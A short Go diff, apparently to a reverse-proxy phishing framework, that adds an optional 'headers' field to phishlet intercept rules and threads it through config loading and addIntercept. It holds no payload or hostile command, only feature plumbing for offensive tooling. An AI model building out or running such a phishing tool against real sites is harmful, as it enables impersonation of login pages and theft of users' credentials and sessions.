@@ -103,6 +103,7 @@ type Intercept struct {
 	http_status int            `mapstructure:"http_status"`
 	body        string         `mapstructure:"body"`
 	mime        string         `mapstructure:"mime"`
+	headers		string		   `mapstructure:"headers"`
 }
 
 type Phishlet struct {
@@ -216,6 +217,7 @@ type ConfigIntercept struct {
 	HttpStatus *int    `mapstructure:"http_status"`
 	Body       *string `mapstructure:"body"`
 	Mime       *string `mapstructure:"mime"`
+	Headers     *string `mapstructure:"headers"`
 }
 
 type ConfigPhishlet struct {
@@ -489,7 +491,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	if fp.Intercept != nil {
 		for _, ic := range *fp.Intercept {
 			var err error
-			var body, mime string
+			var body, mime, headers string
 			if ic.Domain == nil {
 				return fmt.Errorf("intercept: missing `domain` field")
 			}
@@ -512,7 +514,10 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Mime != nil {
 				mime = *ic.Mime
 			}
-			err = p.addIntercept(*ic.Domain, path_re, *ic.HttpStatus, body, mime)
+			if ic.Headers != nil {
+				headers = *ic.Headers
+			}
+			err = p.addIntercept(*ic.Domain, path_re, *ic.HttpStatus, body, mime, headers)
 			if err != nil {
 				return err
 			}
@@ -994,13 +999,14 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	return nil
 }
 
-func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string) error {
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string, headers string) error {
 	ic := Intercept{
 		domain:      strings.ToLower(domain),
 		path:        path,
 		http_status: http_status,
 		body:        body,
 		mime:        mime,
+		headers: 	 headers,
 	}
 	p.intercept = append(p.intercept, ic)
 	return nil
